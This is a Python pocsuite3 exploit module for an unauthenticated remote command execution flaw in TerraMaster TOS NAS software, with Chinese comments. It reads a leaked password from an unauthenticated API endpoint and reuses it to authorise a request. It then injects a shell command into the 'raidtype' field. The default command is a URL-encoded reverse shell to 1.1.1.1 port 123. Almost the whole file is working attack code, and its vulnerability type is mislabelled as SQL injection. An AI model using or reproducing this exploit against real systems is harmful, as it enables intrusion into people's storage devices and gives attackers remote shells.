from collections import OrderedDict
from email import header
from urllib.parse import urljoin
import re,json
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['test']  #  PoC作者的大名
    vulDate = '2022-03-09'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-03-09'  # 编写 PoC 的日期
    updateDate = '2022-03-09'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'TerraMaster TOS RCE'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'TerraMaster TOS'  # 漏洞应用名称
    appVersion = '''TOS 4.2.x 版本 < 4.2.30，以及所有 4.1.x 版本'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        TerraMaster TOS 通过 PHP 对象实例化执行未经身份验证的远程命令
        https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    利用:pocsuite -r poc++.py -u url(-f url.txt) --attack --cmd 命令（注意url编码）
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString(default='%3Bsh+-i+%3E%26+%2Fdev%2Ftcp%2F1.1.1.1%2F123+0%3E%261%3B', description='', require=True)
        return o

    def _verify(self):
        result = {}
        path = "/module/api.php?mobile/webNasIPS"
        url = self.url + path
        headers = {'User-Agent':'TNAS'}
        try:
            resq = requests.get(url=url,headers=headers,timeout=5)
            #print(resq.text)
            if "webNasIPS successful" in resq.text or "PWD" in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        headers = {'User-Agent':'TNAS'}
        resq = requests.get(url=self.url+'/module/api.php?mobile/webNasIPS',headers=headers,timeout=5)
        data = json.loads(resq.text)['data']
        pattern = re.compile(u"(?<=PWD:)(.*)(?=\\nSAT)")
        str = data
        PWD=pattern.search(str).group()
        #print(PWD)
        headers={
            'User-Agent': 'TNAS',
            'AUTHORIZATION':PWD,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        path = "/module/api.php?mobile/createRaid"
        url = self.url + path
        cmd = self.get_option("cmd")
        payload = f"raidtype={cmd}&diskstring=1646732740"
        #print(payload)
        try:
            resq = requests.post(url=url,headers=headers,data=payload,verify=False)
            t = resq.text 
            t = t.replace('\n', '').replace('\r', '')
            print(t)
            t = t.replace(" ","")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = t
        except Exception as e:
            return
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)
